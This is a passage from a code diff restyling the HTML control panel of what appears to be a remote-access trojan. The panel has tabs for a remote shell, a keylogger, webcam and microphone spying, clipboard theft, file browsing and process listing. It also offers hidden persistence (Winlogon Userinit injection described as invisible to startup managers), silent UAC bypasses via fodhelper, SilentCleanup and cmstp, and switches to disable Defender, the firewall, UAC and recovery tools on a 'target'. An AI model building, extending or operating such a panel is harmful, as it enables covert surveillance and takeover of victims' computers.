         <div class="stream-toolbar" style="border-top:none;padding-top:0;flex-direction:column;align-items:flex-start;gap:6px;">
           <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;width:100%;">
-            <span style="font-size:10px;color:var(--dim);">🎬 MEDIA:</span>
-            <input type="file" id="media-file" accept="audio/*,video/*" style="font-size:10px;color:var(--dim);flex:1;min-width:180px;max-width:320px;">
-            <button class="btn btn-purple btn-sm" onclick="sendMedia(false)">🔊 PLAY</button>
-            <button class="btn btn-red btn-sm" onclick="sendMedia(true)">🔒 PLAY UNCLOSABLE</button>
-            <span id="media-status" style="font-size:10px;color:var(--dim);margin-left:4px;"></span>
+            <span style="font-size:10px;color:var(--muted);font-family:var(--mono);letter-spacing:0.06em;">🎬 MEDIA:</span>
+            <input type="file" id="media-file" accept="audio/*,video/*" style="font-size:10px;color:var(--muted);flex:1;min-width:180px;max-width:320px;">
+            <button class="btn btn-purple btn-sm" onclick="sendMedia(false)">🔊 Play</button>
+            <button class="btn btn-red btn-sm" onclick="sendMedia(true)">🔒 Play Unclosable</button>
+            <span id="media-status" style="font-size:10px;color:var(--muted);margin-left:4px;"></span>
             <span class="stream-status" id="stream-status">IDLE</span>
           </div>
           <div class="upload-progress" id="upload-progress" style="display:none;width:100%;">
@@ -539,53 +1061,53 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
       <div class="tab-content" id="tab-webcam">
         <div class="stream-wrapper" id="webcam-wrapper">
           <img id="webcam-img" src="" alt="" style="display:none;">
-          <div id="webcam-placeholder" style="color:var(--dim);font-size:12px;padding:40px;text-align:center;">Click SNAP or START STREAM</div>
+          <div id="webcam-placeholder" style="color:var(--muted);font-size:12px;padding:40px;text-align:center;">Click SNAP or START STREAM</div>
         </div>
         <div class="stream-toolbar">
-          <button class="btn btn-green btn-sm" onclick="webcamSnap()">📸 SNAP</button>
-          <button class="btn btn-green btn-sm" id="btn-wcam-start" onclick="startWebcam()">▶ STREAM</button>
-          <button class="btn btn-red btn-sm" id="btn-wcam-stop" onclick="stopWebcam()" disabled>■ STOP</button>
+          <button class="btn btn-green btn-sm" onclick="webcamSnap()">📸 Snap</button>
+          <button class="btn btn-green btn-sm" id="btn-wcam-start" onclick="startWebcam()">▶ Stream</button>
+          <button class="btn btn-red btn-sm" id="btn-wcam-stop" onclick="stopWebcam()" disabled>■ Stop</button>
           <span class="stream-status" id="webcam-status">IDLE</span>
         </div>
       </div>
 
       <!-- SHELL -->
       <div class="tab-content" id="tab-shell">
-        <div class="shell-output" id="shell-output"><span style="color:var(--dim);">// Remote shell — type below</span><br></div>
+        <div class="shell-output" id="shell-output"><span style="color:#64748b;">// Remote shell — type below</span><br></div>
         <div class="shell-input-row">
           <span>$</span>
           <input class="shell-input" id="shell-input" type="text" placeholder="command..." autocomplete="off" onkeydown="shellKeyDown(event)">
-          <button class="btn btn-green btn-sm" onclick="runShell()">RUN</button>
-          <button class="btn btn-warn btn-sm" onclick="clearShell()">CLR</button>
+          <button class="btn btn-green btn-sm" onclick="runShell()">Run</button>
+          <button class="btn btn-warn btn-sm" onclick="clearShell()">Clr</button>
         </div>
       </div>
 
       <!-- KEYLOG -->
       <div class="tab-content" id="tab-keylog">
-        <div class="keylog-output" id="keylog-output"><span style="color:var(--dim);">// Keylogger output...</span></div>
+        <div class="keylog-output" id="keylog-output"><span style="color:#64748b;">// Keylogger output...</span></div>
         <div class="keylog-controls">
-          <button class="btn btn-green btn-sm" id="btn-kl-start" onclick="startKeylog()">▶ START</button>
-          <button class="btn btn-red btn-sm" id="btn-kl-stop" onclick="stopKeylog()" disabled>■ STOP</button>
-          <button class="btn btn-warn btn-sm" onclick="clearKeylog()">CLR</button>
-          <button class="btn btn-blue btn-sm" onclick="copyKeylog()">COPY ALL</button>
-          <span id="kl-status" style="font-size:10px;color:var(--dim);margin-left:6px;">IDLE</span>
+          <button class="btn btn-green btn-sm" id="btn-kl-start" onclick="startKeylog()">▶ Start</button>
+          <button class="btn btn-red btn-sm" id="btn-kl-stop" onclick="stopKeylog()" disabled>■ Stop</button>
+          <button class="btn btn-warn btn-sm" onclick="clearKeylog()">Clr</button>
+          <button class="btn btn-blue btn-sm" onclick="copyKeylog()">Copy All</button>
+          <span id="kl-status" style="font-size:10px;color:var(--muted);margin-left:6px;font-family:var(--mono);">IDLE</span>
         </div>
       </div>
 
       <!-- MIC -->
       <div class="tab-content" id="tab-mic">
-        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
-          <button class="btn btn-red btn-sm" id="btn-mic-live" onclick="toggleMicLive()">🎙 LIVE LISTEN</button>
-          <span id="mic-live-status" style="font-size:10px;color:var(--dim);">IDLE</span>
-          <span style="color:var(--border);margin:0 4px;">|</span>
-          <span style="font-size:10px;color:var(--dim);">RECORD:</span>
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap;background:var(--surface);">
+          <button class="btn btn-red btn-sm" id="btn-mic-live" onclick="toggleMicLive()">🎙 Live Listen</button>
+          <span id="mic-live-status" style="font-size:10px;color:var(--muted);font-family:var(--mono);">IDLE</span>
+          <span style="color:var(--border2);margin:0 4px;">|</span>
+          <span style="font-size:10px;color:var(--muted);font-family:var(--mono);">RECORD:</span>
           <input type="number" id="mic-duration" value="10" min="1" max="120" style="width:55px;">
-          <span style="font-size:10px;color:var(--dim);">sec</span>
-          <button class="btn btn-green btn-sm" onclick="startMic()">⏺ RECORD</button>
-          <button class="btn btn-warn btn-sm" onclick="stopMic()">■ STOP</button>
-          <span id="mic-status" style="font-size:10px;color:var(--dim);"></span>
+          <span style="font-size:10px;color:var(--muted);">sec</span>
+          <button class="btn btn-green btn-sm" onclick="startMic()">⏺ Record</button>
+          <button class="btn btn-warn btn-sm" onclick="stopMic()">■ Stop</button>
+          <span id="mic-status" style="font-size:10px;color:var(--muted);font-family:var(--mono);"></span>
         </div>
-        <canvas id="mic-visualizer" height="80" style="flex-shrink:0;width:100%;background:#050810;display:block;"></canvas>
+        <canvas id="mic-visualizer" height="80" style="flex-shrink:0;width:100%;background:#0f1117;display:block;"></canvas>
         <div class="mic-area" id="mic-area">
           <div id="mic-recordings"></div>
         </div>
@@ -594,25 +1116,25 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
       <!-- CLIPBOARD -->
       <div class="tab-content" id="tab-clipboard">
         <div class="clip-area">
-          <div style="font-size:9px;letter-spacing:2px;color:var(--dim);margin-bottom:6px;text-transform:uppercase;">Current Clipboard</div>
+          <div style="font-size:9px;letter-spacing:0.08em;color:var(--muted);margin-bottom:6px;text-transform:uppercase;font-weight:600;">Current Clipboard</div>
           <div class="clip-display" id="clip-display">—</div>
           <div style="display:flex;gap:7px;margin-bottom:14px;">
-            <button class="btn btn-green btn-sm" onclick="getClipboard()">↓ GET</button>
-            <button class="btn btn-blue btn-sm" onclick="copyClipDisplay()">COPY</button>
+            <button class="btn btn-green btn-sm" onclick="getClipboard()">↓ Get</button>
+            <button class="btn btn-blue btn-sm" onclick="copyClipDisplay()">Copy</button>
           </div>
-          <div style="font-size:9px;letter-spacing:2px;color:var(--dim);margin-bottom:6px;text-transform:uppercase;">Set Clipboard</div>
+          <div style="font-size:9px;letter-spacing:0.08em;color:var(--muted);margin-bottom:6px;text-transform:uppercase;font-weight:600;">Set Clipboard</div>
           <textarea class="clip-input" id="clip-input" placeholder="Text to push to target..."></textarea>
-          <button class="btn btn-warn btn-sm" onclick="setClipboard()">↑ PUSH</button>
+          <button class="btn btn-warn btn-sm" onclick="setClipboard()">↑ Push</button>
         </div>
       </div>
 
       <!-- FILES -->
       <div class="tab-content" id="tab-files">
         <div class="fb-nav">
-          <button class="btn btn-blue btn-sm" onclick="fbUp()">↑ UP</button>
-          <button class="btn btn-warn btn-sm" onclick="fbHome()">⌂ HOME</button>
+          <button class="btn btn-blue btn-sm" onclick="fbUp()">↑ Up</button>
+          <button class="btn btn-warn btn-sm" onclick="fbHome()">⌂ Home</button>
           <input class="fb-path" id="fb-path" type="text" placeholder="/path/to/browse" onkeydown="if(event.key==='Enter')fbNavigate()">
-          <button class="btn btn-green btn-sm" onclick="fbNavigate()">GO</button>
+          <button class="btn btn-green btn-sm" onclick="fbNavigate()">Go</button>
         </div>
         <div class="fb-colhdr">
           <div style="width:14px;"></div>
@@ -626,200 +1148,158 @@ select{background:var(--bg);border:1px solid var(--border2);padding:4px 8px;
 
       <!-- NETWORK -->
       <div class="tab-content" id="tab-network">
-        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;">
-          <button class="btn btn-green btn-sm" onclick="getNetinfo()">↻ REFRESH</button>
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;background:var(--surface);">
+          <button class="btn btn-green btn-sm" onclick="getNetinfo()">↻ Refresh</button>
         </div>
         <div style="flex:1;min-height:0;overflow-y:auto;padding:14px 18px;" id="net-content">
-          <div class="no-data">Click REFRESH</div>
+          <div class="no-data">Click Refresh</div>
         </div>
       </div>
 
       <!-- SYSINFO -->
       <div class="tab-content" id="tab-sysinfo">
-        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;">
-          <button class="btn btn-green btn-sm" onclick="getSysinfo()">↻ REFRESH</button>
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;background:var(--surface);">
+          <button class="btn btn-green btn-sm" onclick="getSysinfo()">↻ Refresh</button>
         </div>
         <div style="flex:1;min-height:0;overflow-y:auto;padding:14px 18px;">
-          <div id="sysinfo-content" class="no-data">Click REFRESH</div>
+          <div id="sysinfo-content" class="no-data">Click Refresh</div>
         </div>
       </div>
 
       <!-- PROCESSES -->
       <div class="tab-content" id="tab-processes">
-        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;">
-          <button class="btn btn-green btn-sm" onclick="getProcesses()">↻ REFRESH</button>
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;background:var(--surface);">
+          <button class="btn btn-green btn-sm" onclick="getProcesses()">↻ Refresh</button>
           <input type="text" id="proc-filter" placeholder="filter..." style="width:120px;" oninput="filterProcs()">
         </div>
         <div style="flex:1;min-height:0;overflow-y:auto;padding:0 0 12px;">
-          <div id="proc-content" class="no-data">Click REFRESH</div>
+          <div id="proc-content" class="no-data">Click Refresh</div>
         </div>
       </div>
 
       <!-- AUTO SCREENSHOTS -->
       <div class="tab-content" id="tab-autoshots">
-        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
-          <span style="font-size:10px;color:var(--dim);">INTERVAL:</span>
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;flex-wrap:wrap;background:var(--surface);">
+          <span style="font-size:10px;color:var(--muted);font-family:var(--mono);">INTERVAL:</span>
           <input type="number" id="ss-interval" value="30" min="5" max="300" style="width:60px;">
-          <span style="font-size:10px;color:var(--dim);">sec</span>
-          <button class="btn btn-green btn-sm" id="btn-ss-start" onclick="startAutoSS()">▶ START</button>
-          <button class="btn btn-red btn-sm" id="btn-ss-stop" onclick="stopAutoSS()" disabled>■ STOP</button>
-          <button class="btn btn-warn btn-sm" onclick="clearAutoSS()">CLR</button>
-          <span id="ss-status" style="font-size:10px;color:var(--dim);">IDLE</span>
+          <span style="font-size:10px;color:var(--muted);">sec</span>
+          <button class="btn btn-green btn-sm" id="btn-ss-start" onclick="startAutoSS()">▶ Start</button>
+          <button class="btn btn-red btn-sm" id="btn-ss-stop" onclick="stopAutoSS()" disabled>■ Stop</button>
+          <button class="btn btn-warn btn-sm" onclick="clearAutoSS()">Clr</button>
+          <span id="ss-status" style="font-size:10px;color:var(--muted);font-family:var(--mono);">IDLE</span>
         </div>
         <div class="ss-gallery" id="ss-gallery"><div class="no-data" style="grid-column:1/-1;">Screenshots will appear here</div></div>
       </div>
 
       <!-- CHAT -->
       <div class="tab-content" id="tab-chat">
-        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;">
-          <button class="btn btn-green btn-sm" id="btn-chat-open" onclick="openChatSession()">▶ OPEN SESSION</button>
-          <button class="btn btn-red btn-sm" id="btn-chat-close" onclick="closeChatSession()" disabled>■ CLOSE SESSION</button>
-          <span id="chat-session-status" style="font-size:10px;color:var(--dim);">NO ACTIVE SESSION</span>
+        <div style="flex-shrink:0;padding:8px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;background:var(--surface);">
+          <button class="btn btn-green btn-sm" id="btn-chat-open" onclick="openChatSession()">▶ Open Session</button>
+          <button class="btn btn-red btn-sm" id="btn-chat-close" onclick="closeChatSession()" disabled>■ Close Session</button>
+          <span id="chat-session-status" style="font-size:10px;color:var(--muted);font-family:var(--mono);">NO ACTIVE SESSION</span>
         </div>
         <div class="chat-messages" id="chat-messages">
           <div class="no-data">Open a session to start chatting — a window will appear on the target's screen</div>
         </div>
         <div class="chat-input-row">
           <input class="chat-input" id="chat-input" type="text" placeholder="Type a message..." onkeydown="if(event.key==='Enter')sendChat()" disabled>
-          <button class="btn btn-green btn-sm" id="btn-chat-send" onclick="sendChat()" disabled>SEND</button>
+          <button class="btn btn-green btn-sm" id="btn-chat-send" onclick="sendChat()" disabled>Send</button>
         </div>
       </div>
 
       <!-- PERSIST -->
       <div class="tab-content" id="tab-persist">
         <div class="persist-area">
-          <div style="margin-bottom:20px;padding:14px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);">
-            <div style="font-size:10px;color:var(--warn);letter-spacing:2px;margin-bottom:6px;">⚠ PERSISTENCE</div>
-            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Installs the agent to auto-start on login.<br>Windows: Task Scheduler (logon trigger) · macOS: LaunchAgent · Linux: Systemd user service</div>
+          <div class="info-banner warn">
+            <div class="info-banner-title">⚠ PERSISTENCE</div>
+            <div style="color:var(--muted);">Installs the agent to auto-start on login.<br>Windows: Task Scheduler (logon trigger) · macOS: LaunchAgent · Linux: Systemd user service</div>
           </div>
           <div style="display:flex;gap:10px;margin-bottom:20px;">
-            <button class="btn btn-warn" onclick="persistInstall()">⚙ INSTALL AUTOSTART</button>
-            <button class="btn btn-red" onclick="persistRemove()">✕ REMOVE AUTOSTART</button>
+            <button class="btn btn-warn" onclick="persistInstall()">⚙ Install Autostart</button>
+            <button class="btn btn-red" onclick="persistRemove()">✕ Remove Autostart</button>
           </div>
-          <div id="persist-result" style="font-size:12px;color:var(--dim);"></div>
+          <div id="persist-result" style="font-size:12px;color:var(--muted);"></div>
         </div>
       </div>
 
       <!-- PRIVESC -->
       <div class="tab-content" id="tab-privesc">
         <div class="persist-area">
-          <div style="margin-bottom:16px;padding:14px;background:rgba(255,107,53,0.06);border:1px solid rgba(255,107,53,0.2);">
-            <div style="font-size:10px;color:var(--warn);letter-spacing:2px;margin-bottom:6px;">⚡ PRIVILEGE ESCALATION</div>
-            <div style="font-size:11px;color:var(--dim);line-height:1.8;">Relaunches the agent elevated using the same Client ID.<br><br>
-              <span style="color:var(--accent);">🛡 UAC Prompt:</span> Shows a UAC dialog on target.<br>
-              <span style="color:var(--accent2);">🪟 FodHelper:</span> Silent bypass via fodhelper.exe autoElevate.<br>
-              <span style="color:var(--accent2);">🧹 SilentCleanup:</span> Silent bypass via WINDIR registry hijack.<br>
-              <span style="color:var(--accent2);">📋 cmstp.exe:</span> Silent bypass via CM shell .inf auto-execute.
+          <div class="info-banner warn">
+            <div class="info-banner-title">⚡ PRIVILEGE ESCALATION</div>
+            <div style="color:var(--muted);">Relaunches the agent elevated using the same Client ID.<br><br>
+              <span style="color:var(--green);">🛡 UAC Prompt:</span> Shows a UAC dialog on target.<br>
+              <span style="color:var(--accent);">🪟 FodHelper:</span> Silent bypass via fodhelper.exe autoElevate.<br>
+              <span style="color:var(--accent);">🧹 SilentCleanup:</span> Silent bypass via WINDIR registry hijack.<br>
+              <span style="color:var(--accent);">📋 cmstp.exe:</span> Silent bypass via CM shell .inf auto-execute.
             </div>
           </div>
           <div style="display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap;">
-            <button class="btn btn-green" onclick="privescRun('uac_prompt')">🛡 UAC PROMPT</button>
-            <button class="btn btn-warn" onclick="privescRun('silentcleanup')" style="border-color:var(--accent);color:var(--accent);">🧹 SILENTCLEANUP ✔</button>
-            <button class="btn btn-warn" onclick="privescRun('fodhelper')">🪟 FODHELPER</button>
-            <button class="btn btn-warn" onclick="privescRun('cmstp')">📋 CMSTP</button>
-            <button class="btn btn-blue btn-sm" onclick="privescCheckAdmin()">? CHECK ADMIN</button>
+            <button class="btn btn-green" onclick="privescRun('uac_prompt')">🛡 UAC Prompt</button>
+            <button class="btn btn-warn" onclick="privescRun('silentcleanup')">🧹 SilentCleanup ✔</button>
+            <button class="btn btn-warn" onclick="privescRun('fodhelper')">🪟 FodHelper</button>
+            <button class="btn btn-warn" onclick="privescRun('cmstp')">📋 cmstp</button>
+            <button class="btn btn-blue btn-sm" onclick="privescCheckAdmin()">? Check Admin</button>
           </div>
-          <div id="privesc-result" style="font-size:12px;color:var(--dim);background:#050810;border:1px solid var(--border);padding:10px 14px;min-height:60px;white-space:pre-wrap;line-height:1.8;"></div>
+          <div id="privesc-result" style="font-size:12px;color:var(--muted);background:var(--surface2);border:1px solid var(--border2);border-radius:var(--radius);padding:10px 14px;min-height:60px;white-space:pre-wrap;line-height:1.8;"></div>
         </div>
       </div>
 
       <!-- ADMIN -->
       <div class="tab-content" id="tab-admin">
         <div style="flex:1;min-height:0;overflow-y:auto;padding:16px 18px;">
-          <div style="margin-bottom:4px;font-size:9px;letter-spacing:3px;color:var(--danger);text-transform:uppercase;">⚠ Requires Administrator — use PRIVESC tab first if needed</div>
-          <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">System Tools</div>
-          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:4px;">
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Task Manager</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('taskmgr_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('taskmgr_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Registry Editor (regedit)</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('regedit_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('regedit_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Command Prompt (cmd)</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('cmd_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('cmd_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Control Panel</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('controlpanel_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('controlpanel_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">reagentc.exe (WinRE)</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('reagentc_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('reagentc_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Run Dialog (Win+R)</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('rundialog_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('rundialog_enable')">ENABLE</button></div>
-            </div>
+          <div style="margin-bottom:4px;font-size:9px;letter-spacing:0.1em;color:var(--red);text-transform:uppercase;font-weight:600;">⚠ Requires Administrator — use PRIVESC tab first if needed</div>
+          <div class="section-head">System Tools</div>
+          <div class="panel-grid">
+            <div class="panel-card"><div class="panel-card-title">Task Manager</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('taskmgr_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('taskmgr_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">Registry Editor</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('regedit_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('regedit_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">Command Prompt</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('cmd_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('cmd_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">Control Panel</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('controlpanel_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('controlpanel_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">reagentc.exe (WinRE)</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('reagentc_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('reagentc_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">Run Dialog (Win+R)</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('rundialog_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('rundialog_enable')">Enable</button></div></div>
           </div>
-          <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Windows Defender / Security</div>
-          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:4px;">
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Windows Defender (Real-time)</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('defender_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('defender_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Windows Firewall</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('firewall_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('firewall_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">UAC (User Account Control)</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('uac_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('uac_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Windows Update</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('wupdate_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('wupdate_enable')">ENABLE</button></div>
-            </div>
+          <div class="section-head">Windows Defender / Security</div>
+          <div class="panel-grid">
+            <div class="panel-card"><div class="panel-card-title">Windows Defender (Real-time)</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('defender_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('defender_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">Windows Firewall</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('firewall_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('firewall_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">UAC</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('uac_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('uac_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">Windows Update</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('wupdate_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('wupdate_enable')">Enable</button></div></div>
           </div>
-          <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Desktop Restrictions</div>
-          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:4px;">
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Right-Click Desktop Menu</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('rightclick_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('rightclick_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Lock Screen</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('lockscreen_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('lockscreen_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">USB Storage</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('usb_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('usb_enable')">ENABLE</button></div>
-            </div>
-            <div style="background:var(--panel2);border:1px solid var(--border);padding:10px 14px;">
-              <div style="font-size:11px;color:var(--text);margin-bottom:8px;">Startup Repair (WinRE Boot)</div>
-              <div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('startuprepair_disable')">DISABLE</button><button class="btn btn-green btn-sm" onclick="adminCmd('startuprepair_enable')">ENABLE</button></div>
-            </div>
+          <div class="section-head">Desktop Restrictions</div>
+          <div class="panel-grid">
+            <div class="panel-card"><div class="panel-card-title">Right-Click Desktop Menu</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('rightclick_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('rightclick_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">Lock Screen</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('lockscreen_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('lockscreen_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">USB Storage</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('usb_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('usb_enable')">Enable</button></div></div>
+            <div class="panel-card"><div class="panel-card-title">Startup Repair (WinRE Boot)</div><div style="display:flex;gap:6px;"><button class="btn btn-red btn-sm" onclick="adminCmd('startuprepair_disable')">Disable</button><button class="btn btn-green btn-sm" onclick="adminCmd('startuprepair_enable')">Enable</button></div></div>
           </div>
-          <div style="margin:14px 0 8px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);padding-bottom:4px;">Winlogon Startup Persistence</div>
-          <div style="background:var(--panel2);border:1px solid var(--border);padding:12px 14px;margin-bottom:4px;">
-            <div style="font-size:11px;color:var(--text);margin-bottom:6px;">Injects the agent's executable path into <span style="color:var(--accent2)">HKLM\…\Winlogon → Userinit</span>, which runs on every user login — survives reboots and is invisible to standard startup managers.</div>
+          <div class="section-head">Winlogon Startup Persistence</div>
+          <div class="panel-card" style="margin-bottom:4px;">
+            <div style="font-size:11px;color:var(--muted);margin-bottom:8px;line-height:1.7;">Injects the agent's executable path into <span style="color:var(--accent);font-family:var(--mono)">HKLM\…\Winlogon → Userinit</span>, which runs on every user login — survives reboots and is invisible to standard startup managers.</div>
             <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
-              <button class="btn btn-red btn-sm" onclick="adminCmd('winlogon_add')">⚡ INJECT WINLOGON</button>
-              <button class="btn btn-green btn-sm" onclick="adminCmd('winlogon_remove')">✕ REMOVE WINLOGON</button>
-              <button class="btn btn-blue btn-sm" onclick="adminCmd('winlogon_check')">? CHECK STATUS</button>
+              <button class="btn btn-red btn-sm" onclick="adminCmd('winlogon_add')">⚡ Inject Winlogon</button>
+              <button class="btn btn-green btn-sm" onclick="adminCmd('winlogon_remove')">✕ Remove Winlogon</button>
